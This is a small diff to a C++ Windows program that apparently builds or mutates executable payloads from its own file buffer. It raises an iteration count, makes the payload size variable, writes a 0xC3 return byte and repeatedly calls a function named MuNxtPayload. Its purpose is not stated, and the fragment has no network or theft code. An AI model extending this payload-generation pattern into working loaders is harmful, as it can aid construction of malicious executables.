@@ -4,8 +4,8 @@
 #include <iostream>
 #include<Windows.h>
 #include<sys\timeb.h> 
-#define NextPayloadSize 1024
-#define NextNum 3
+int NextPayloadSize = 1024;
+#define NextNum 5
 #define GapTime 128
 
 int myEXESize = 0;
@@ -64,8 +64,11 @@ int main(int argc, char** argv)
         nextPayloadBuf[NextPayloadSize - 1] = 0xC3;
     }
     else
+    {
         nextPayloadBuf = myFileBuffer + myStaticLength;
-        
+        NextPayloadSize = myPayloadLength;
+    }
+
     for (int i = 0; i < NextNum; i++)
     {
         MuNxtPayload();
